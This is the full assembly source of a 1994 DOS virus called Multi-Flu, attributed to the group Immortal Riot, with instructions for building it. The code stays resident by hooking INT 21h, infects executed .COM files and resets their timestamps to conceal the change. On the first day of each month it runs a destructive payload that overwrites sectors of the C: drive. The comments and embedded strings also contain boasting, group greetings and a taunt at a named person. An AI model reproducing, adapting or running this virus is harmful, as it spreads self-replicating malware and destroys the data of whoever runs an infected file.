; Virusname: Multi-Flu
; Origin   : Sweden
; Author   : Metal Militia/Immortal Riot
;
; Multi-Flu's a resident infector of .COM files (w/the exception of
; COMMAND.COM when they're executed. If the date's the first of any 
; month it'll overwrite 9999 sectors on the C: drive, thereby rendering 
; it useless. After this it still goes resident though, just in case the 
; user started the infected file from some other drive.
;
; To assembly this: Use Tasm    Filename.asm
;                       Tlink   Filename.obj
;                       Exe2bin	Filename.exe Virus.com

CODE    SEGMENT
	ASSUME CS:CODE,DS:CODE,ES:CODE,SS:CODE

SVIR    EQU     $                      ; Start of FULL virus code


VLENGTH EQU     EOV-SVIR               ; Size of virus
GTHANG  EQU     1994h                  ; Paragraphs from TOP O' MEM
                                       ; to put us

ENTRY:  CALL GETDELTA                  ; Get the DELTA offset
        NOP
GETDELTA:
	POP BP
        SUB BP,OFFSET(GETDELTA)-1      ; Calculate it

START   PROC NEAR
        CALL ROCKME                    ; Find total number o' paragraphs
        SUB AX,GTHANG                  ; Get segment of where our copy
        JMP PUSH_ME                    ; might be
        db  "COPY ME, SO I CAN TRAVEL!!!!!"
PUSH_ME:
        PUSH AX
	POP ES
        JMP PUSH_ME_AGAIN_CAUSE_I_SAY_SO
        db  "Why am i so fly? ;)"
PUSH_ME_AGAIN_CAUSE_I_SAY_SO:
        CALL MOVE_DA_LIL_BABE
	PUSH CS
        POP ES                         ; Get ID thang from segment
                                       ; (viral=
        CALL FUNKY

ALREADY_IN_DA_MEM_THANG:
        CMP CX,CS:[BP+OFFSET(TAG)]     ; Already in memory?
        JZ  ORGIT                      ; If so, RET(urn) to org. proggy
        JMP INSTALL                    ; Else, install us..
						
ORGIT:  LEA SI,[BP+OFFSET(FIRSTCODE)]
        MOV CX,SMILELEN

        CALL FUNKY                     ; Lets 'FUNK' out :)

        MOV DI,100h                    ; di equal 100h (sov)

        REP MOVSB                      ; Copy org. bytes to da place

        CALL FUNKY                     ; Yet anotha FUNK calling

        MOV AX,100h                    ; AX = 100h
        PUSH AX                        ; And push it....
        RET                            ; Return to org. dude

MOVE_DA_LIL_BABE:
        MOV CX,ES:TAG                  ; Is mah lil' grafitti tag here?

FUNKY:  RET                            ; RET to code caller

INSTALL:
        MOV AX,3521h                   ; Get vector (INT 21h)
        INT 21h                        ; --------------^

        CALL FUNKY

        MOV CS:[BP+OFFSET(OLD21A)],BX  ; Save the old one
        MOV CS:[BP+OFFSET(OLD21B)],ES  ; here right now

        CALL FUNKY
        CALL ROCKME                    ; See above in the code

        SUB AX,GTHANG                  ; How much to put MEMRES
        PUSH AX                        ; Mhmmm..
        JMP  PUSH_SOME_MORE_ONES
        DB   "Mmm.. Mmm.. Mmm.."

PUSH_SOME_MORE_ONES:
        PUSH AX
        POP ES                         ; Segment (destination)
        JMP PUSH_THANG
        DB  "For the smell of it!!!!!"
PUSH_THANG:
        PUSH CS
        POP DS                         ; Segment (source)

        CALL FUNKY

        MOV SI,BP                      ; Start of virus = DELTA thang
        MOV DI,0                       ; Sub di,di or Xor di,di
        JMP VIR_LEN_ME_NOW
        db  "MULTIMULTIMULTIMULTI"
VIR_LEN_ME_NOW:
        MOV CX,OFFSET VLENGTH                 ; Virus length

        REP MOVSB                             ; Move our lazy ass there

        POP DS
        MOV DX,OFFSET(VECTOR)                 ; Now, offset *OUR* INT21

        CALL FUNKY

        MOV AX,2521h                          ; Set vector (INT 21h)
	INT 21h

	PUSH CS
	POP ES

        CALL FUNKY

        PUSH CS
        POP DS                                ; Segments (reset)

        MOV AH,2Ah                            ; Get date
        INT 21h

        CMP DL,1                              ; First of any month?
        JNE PHUNKSTER                         ; If not, go on as normal
                                              ; Else, NUKE!!!!!
FUCK_EM:
        MOV AL,2                              ; [C:] drive
        MOV CX,270h                           ; 9999 sectors
        CWD                                   ; starting with the 'BOOT'
        INT 26h                               ; Direct diskwrite
        POPF
PHUNKSTER:
        JMP ORGIT

START	ENDP

ROCKME  PROC NEAR
        INT 12h                        ; Gimme total numba
        jmp cx_me                      ; o' kilobytes mem

        db  "MULTI-FLU v1.0"

cx_me:
        MOV CX,1024                    ; one kilobyte equal 1024 bytes
        jmp multi_kewl

        db  "(c) 1994 Metal Militia"

multi_kewl:
        MUL CX                         ; a 'multiply' i guess
        jmp seg_me

        db  "Immortal Riot"

seg_me:
        MOV CX,16                      ; Segment (16 bytes in each)
        jmp div_kewl

        db  "Sweden"

div_kewl:
        DIV CX                         ; Divide (AX & DX by CX)

        RET                            ; Back to code caller
ROCKME  ENDP

TSMILE  EQU     $

IRNOP:  XCHG AX,AX                     ; Or.. shall we say, NOP!!!!!
        DB      0BBh                   ; BX (MOV)
VMENOW  DW      0                      ; offset our code
        PUSH BX                        ; push....
        RET                            ; and jump to it

BSMILE  EQU     $
SMILELEN EQU     BSMILE-TSMILE         ; Length of this "procedure"

OLD21A  DW      0
OLD21B  DW      0                      ;Original INT 21h vector

TEXTONE DB      "M"

BUFFA   DW      0                      ; Infectioncheck buffa

TEXTTWO DB      "U"

EXEPHILEZ DB    'MZ'                   ; To see if the file's and .EXE

TEXTTHREE DB    "L"

OTHEREXEZ DB    'ZM'                   ; See above

COMMIECOM DB    0e9h, 0ddh             ; Marker for COMMAND.COM in
                                       ; MSDOS v6.x (perhaps others too)
TEXTFOUR  DB    "T"

FIRSTCODE DB      0CDh
          DB      20h                    ; Here we save the org. bytes
          DB      SMILELEN-2 DUP ('?')

TEXTFIVE  DB    "i"

OLDTIME DW      0
OLDDATE DW      0                      ;Old file time and date

NOCHEINTEXT DB "FLU"

FAKEIT   PROC NEAR                      ; It's used to call org. INT 21h
         PUSHF
         CALL DWORD PTR CS:OLD21A       ; Call the original
         RET                            ; RET to code caller
FAKEIT   ENDP

VECTOR  PROC NEAR                      ;INT 21h vector
	NOP

        CMP AX,4B00h                   ; Exec 'em?
        JE VTRIGGA                     ; If so, infect

        JMP DWORD PTR CS:OLD21A        ; switch back to original INT21
VTRIGGA:
	PUSH AX
	PUSH BX
	PUSH CX
	PUSH DX
	PUSH SI
	PUSH DI
	PUSH ES
	PUSH DS
        PUSH BP                        ; Save all reg's

INFECT: MOV AX,3D02h                   ; READ/WRITE (open file)
        CALL FAKEIT

        XCHG BX,AX                     ; mov bx,ax

        MOV AX,5700h                   ; save the
        CALL FAKEIT

        MOV CS:OLDTIME,CX              ; original time
        MOV CS:OLDDATE,DX              ; and date here
        JMP TIMER

        DB  "All viruswriters worldwide"

TIMER:
        MOV CX,2                          ; two bytes
        JMP PUSH_IT_RIGHT_AT_THIS_MOMENT

        db  "are to be gratulated!!!!!"

PUSH_IT_RIGHT_AT_THIS_MOMENT:
        PUSH CS
	POP DS
        JMP OPEN_DA_BUFFA_RIGHT_AWAY

        DB  "FLUFLUFLUFLU"

OPEN_DA_BUFFA_RIGHT_AWAY:
        MOV DX,OFFSET BUFFA              ; into this buffa
        MOV AH,3Fh                       ; read 'em
        CALL FAKEIT
        JMP CHECK_IN_DA_BUFFA

        DB  "Written during SUMMERTIME!!!!!"

CHECK_IN_DA_BUFFA:
        MOV DX,CS:BUFFA
        CMP DX, WORD PTR [OFFSET IRNOP] ; Check if already infected
        JE QUIT_IT                      ; if so, exit
        CMP DX, WORD PTR [OFFSET EXEPHILEZ] ; Check if .EXE
        JE QUIT_IT                          ; if so, exit
        CMP DX, WORD PTR [OFFSET OTHEREXEZ] ; See above
        JE QUIT_IT                          ; if so, exit
        CMP DX, WORD PTR [OFFSET COMMIECOM] ; Check if COMMAND.COM
        JNE KEEP_ON_SPREADING               ; if not, infect the fucker
QUIT_IT:
        JMP ENDINF        ; Outa here (for now.. <g>)
KEEP_ON_SPREADING:
        CALL SOF          ; Goto start of file

        MOV CX,SMILELEN   ; Offset the code we'll have first in
        JMP UNIROCKER     ; infected file, and jmp
        db  "Happy happy! Joy joy!"
UNIROCKER:
        MOV DX,OFFSET(FIRSTCODE)       ; Offset da buffa

        MOV AH,3Fh                     ; Read from it
        CALL FAKEIT                    ; 'Fake' an INT 21h

        CALL EOF                       ; Goto end of file

        ADD AX,100h
        JMP GO_FOR_IT
        db  "Winterkvist is"

GO_FOR_IT:
        MOV CS:VMENOW,AX              ; Branch (set up code offset)

        MOV CX,VLENGTH                ; Length of virus code
        JMP WRITE_DA_VIRUS
        db  "a looser!!!!!"
WRITE_DA_VIRUS:
        CWD                            ; Sub dx,dx or Xor dx,dx

        MOV AH,40h                     ; Write it
        CALL FAKEIT

        CALL SOF                       ; FPOINTER thang

        MOV CX,SMILELEN                ;Length of branch code
        JMP WRITE_FIRST_BYTES
        db  "Greetings to the rest"
WRITE_FIRST_BYTES:
        MOV DX,OFFSET(IRNOP)          ;Write the branch code

	MOV AH,40h                     ;Write file or device
        CALL FAKEIT
        JMP  ENDINF
        db   "of IMMORTAL RIOT"

ENDINF: MOV  CX,OLDTIME
        MOV  DX,OLDDATE
        JMP  ORG_TIME_BACK
        DB   "This is property of IR"

ORG_TIME_BACK:
        MOV  AX,5701h                 ; restore original date/time
        CALL FAKEIT

        MOV AH,3Eh                    ; close the file
        CALL FAKEIT

NO_FILE:
        POP BP                         ; Pop all register (restore)
	POP DS
	POP ES
	POP DI
	POP SI
	POP DX
	POP CX
	POP BX
        POP AX

        JMP DWORD PTR CS:OLD21A        ; Mission completed, back to old
EOF:
        MOV AX,4202h                   ; Goto end of file
        JMP XOR_EM
SOF:
        MOV AX,4200h                   ; Goto start of file
XOR_EM:
        SUB CX,CX
        CWD
        CALL FAKEIT
        RET                            ; RET to code caller
VECTOR  ENDP

TAG     DW      1234h                  ; Digi grafitti TAG for checking
                                       ; if it's already in memory
EOV     EQU     $                      ; Here the fun ends guys

CODE    ENDS
	END
